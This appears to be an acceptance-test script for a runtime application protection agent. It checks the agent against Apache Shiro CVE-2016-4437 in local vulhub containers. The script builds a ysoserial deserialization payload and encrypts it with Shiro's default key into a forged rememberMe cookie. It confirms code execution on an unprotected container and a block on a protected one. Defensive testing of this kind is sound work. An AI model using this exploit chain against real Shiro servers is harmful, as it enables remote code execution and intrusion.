#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_SHIRO_4437_IMAGE:-vulhub/shiro:1.2.4}"
baseline_name="${OHMYRASP_VULHUB_SHIRO_4437_BASELINE_NAME:-ohmyrasp-vulhub-shiro-4437-baseline}"
protected_name="${OHMYRASP_VULHUB_SHIRO_4437_PROTECTED_NAME:-ohmyrasp-vulhub-shiro-4437-protected}"
baseline_port="${OHMYRASP_VULHUB_SHIRO_4437_BASELINE_PORT:-19146}"
protected_port="${OHMYRASP_VULHUB_SHIRO_4437_PROTECTED_PORT:-19147}"
payload_dir="${OHMYRASP_VULHUB_SHIRO_4437_PAYLOAD_DIR:-/tmp/ohmyrasp-shiro-4437}"
ysoserial_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
marker="${OHMYRASP_VULHUB_SHIRO_4437_MARKER:-/tmp/ohmyrasp-shiro-4437-success}"
baseline_dir="logs/vulhub-shiro-2016-4437-java8-baseline"
protected_dir="logs/vulhub-shiro-2016-4437-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

prepare_cookie() {
  mkdir -p "$payload_dir" "$ysoserial_dir"
  if [[ ! -s "${ysoserial_dir}/ysoserial.jar" ]]; then
    rm -rf "${ysoserial_dir}/src"
    docker run --rm -v "${ysoserial_dir}:/work" -w /work maven:3.8.1-jdk-8 \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
  cp "${ysoserial_dir}/ysoserial.jar" "${payload_dir}/ysoserial.jar"
  docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
    bash -lc "/usr/local/openjdk-8/bin/java -jar ysoserial.jar CommonsBeanutils1 'touch ${marker}' > shiro-4437.ser && test -s shiro-4437.ser"
  python3 - "$payload_dir" <<'PY'
import base64
import os
import pathlib
import subprocess
import sys

payload_dir = pathlib.Path(sys.argv[1])
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = os.urandom(16)
ciphertext = payload_dir / "shiro-4437.ct"
subprocess.run(
    [
        "openssl",
        "enc",
        "-aes-128-cbc",
        "-K",
        key.hex(),
        "-iv",
        iv.hex(),
        "-in",
        str(payload_dir / "shiro-4437.ser"),
        "-out",
        str(ciphertext),
    ],
    check=True,
)
cookie = base64.b64encode(iv + ciphertext.read_bytes()).decode("ascii")
(payload_dir / "rememberme.cookie").write_text(cookie + "\n", encoding="ascii")
PY
}

wait_for_shiro() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 120); do
    status="$(
      curl --max-time 5 -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
        "http://127.0.0.1:${port}/login" 2>/dev/null || true
    )"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Shiro CVE-2016-4437 did not become ready at ${port}" >&2
  exit 1
}

send_cookie() {
  local port="$1"
  local output="$2"
  local cookie
  cookie="$(tr -d '\n' < "${payload_dir}/rememberme.cookie")"
  curl -sS -i -o "$output" -w "%{http_code}" \
    -H "Cookie: rememberMe=${cookie}" \
    "http://127.0.0.1:${port}/" || true
}

expect_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2 || true
    echo "missing Java 8 startup event for Shiro CVE-2016-4437" >&2
    exit 1
  fi
  if ! grep -q '"request_hook":"installed"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2
    echo "missing Java 8 request hook startup marker for Shiro CVE-2016-4437" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    sed -n '1,160p' "$protected_log" >&2
    echo "Shiro CVE-2016-4437 produced a detection before the rememberMe request" >&2
    exit 1
  fi
}

wait_for_default_cookie_block() {
  for attempt in $(seq 1 30); do
    printf 'default_cookie_block_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
    if grep -Eq '"algorithm":"java8_request_default_crypto_cookie".*"action":"block"' \
      "$protected_log" 2>/dev/null; then
      return
    fi
    sleep 1
  done
  sed -n '1,200p' "$protected_log" >&2 || true
  echo "missing java8_request_default_crypto_cookie block event for Shiro CVE-2016-4437" >&2
  exit 1
}

prepare_cookie
rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" "$image" >/dev/null
wait_for_shiro "$baseline_name" "$baseline_port" "$baseline_dir"
baseline_status="$(send_cookie "$baseline_port" "${baseline_dir}/rememberme.response")"
printf 'baseline_rememberme_status=%s\n' "$baseline_status" >> "${baseline_dir}/attempts.log"
if ! docker exec "$baseline_name" test -f "$marker"; then
  sed -n '1,160p' "${baseline_dir}/rememberme.response" >&2 || true
  docker exec "$baseline_name" ls -la /tmp >&2 || true
  echo "Shiro CVE-2016-4437 baseline did not create ${marker}" >&2
  exit 1
fi

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  "$image" \
  java -javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar \
    -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl \
    -Dohmyrasp.java8.block=true \
    -jar /shirodemo-1.0-SNAPSHOT.jar \
  >/dev/null

wait_for_shiro "$protected_name" "$protected_port" "$protected_dir"
expect_startup_without_detection
protected_status="$(send_cookie "$protected_port" "${protected_dir}/rememberme.response")"
printf 'protected_rememberme_status=%s\n' "$protected_status" >> "${protected_dir}/attempts.log"
wait_for_default_cookie_block
if docker exec "$protected_name" test -f "$marker"; then
  docker exec "$protected_name" ls -la "$marker" >&2 || true
  echo "Shiro CVE-2016-4437 protected marker was created despite block" >&2
  exit 1
fi

echo "vulhub Shiro CVE-2016-4437 Java8 acceptance passed"
